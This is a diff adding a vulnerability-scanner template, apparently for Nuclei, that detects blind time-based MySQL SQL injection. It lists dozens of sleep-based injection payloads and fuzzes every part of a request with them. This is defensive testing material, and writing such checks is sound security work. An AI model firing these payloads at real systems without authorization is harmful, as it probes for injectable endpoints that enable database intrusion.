@@ -1,0 +1,68 @@
+id: mysql-blind-time-based-sqli
+
+info:
+  name: MySQL SQLi - Blind Time based
+  author: pdteam
+  severity: critical
+  reference:
+    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionMySqlScanRule.java
+
+http:
+  - payloads:
+      injections:
+        low:
+          - " / sleep([SLEEPTIME]) "
+          - "' / sleep([SLEEPTIME]) / '"
+          - "\" / sleep([SLEEPTIME]) / \""
+        medium:
+          - " and 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "' and 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "\" and 0 in (select sleep([SLEEPTIME]) ) -- "
+          - " where 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "' where 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "\" where 0 in (select sleep([SLEEPTIME]) ) -- "
+        high:
+          - "\" where 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
+          - " and 0 in (select sleep([SLEEPTIME]) ) "
+          - "' and 0 in (select sleep([SLEEPTIME]) ) and ''='"
+          - "\" and 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
+          - "(CASE WHEN (8895=8895) THEN SLEEP([SLEEPTIME]) ELSE 8895 END)"
+          - "(select*from(select(sleep([SLEEPTIME])))a)"
+          - "(select(0)from(select(sleep([SLEEPTIME])))v)/*'+"
+          - "orwa';%20waitfor%20delay%20'0:0:10'%20--%20"
+          - ";SELECT IF((10303>10302),SLEEP([SLEEPTIME]),231010)#"
+          - "0"XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR"Z"
+          - "0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z"
+          - "0\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR\"Z"
+          - "\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR\"Z"
+          - ";SELECT PG_SLEEP([SLEEPTIME])--"
+          - "\'+UNION+SELECT+sleep([SLEEPTIME])+#"
+          - "\';SELECT PG_SLEEP([SLEEPTIME])--+"
+          - "\%2c(select*from(select(sleep([SLEEPTIME])))a)"
+          - ";select+sleep([SLEEPTIME]);;#"
+          - "if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0)"
+          - "if(now()=sysdate(),sleep([SLEEPTIME]),0)"
+          - "XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR"
+          - "(select(0)from(select(sleep([SLEEPTIME])))v)"
+          - "0'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR'Z"
+          - "0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z"
+          - "if(now()=sysdate(),sleep([SLEEPTIME]),0)/*'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR"*/"
+          
+    attack: pitchfork
+    analyzer:
+      name: time_delay
+        
+    fuzzing:
+      - part: request # fuzz all the request parts.
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injections}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: analyzer
+        words:
+          - "true"
